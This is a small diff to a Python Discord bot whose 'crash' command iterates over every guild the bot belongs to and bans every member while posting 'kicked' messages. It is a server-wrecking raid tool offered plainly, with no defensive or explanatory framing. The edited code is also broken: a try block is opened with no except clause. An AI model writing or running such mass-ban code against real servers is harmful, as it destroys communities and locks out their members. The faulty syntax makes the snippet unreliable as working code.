@@ -6,6 +6,8 @@ bot = commands.Bot(command_prefix="!", case_insensitive=True)
 async def crash(ctx):
     for guild in bot.guilds:
         for member in guild.members:
-            await ctx.send(member + "kicked")
-            await member.ban()
+            await ctx.send("kicked")
+            await ctx.send(member)
+            try:
+                await member.ban()
 bot.run("token here please")
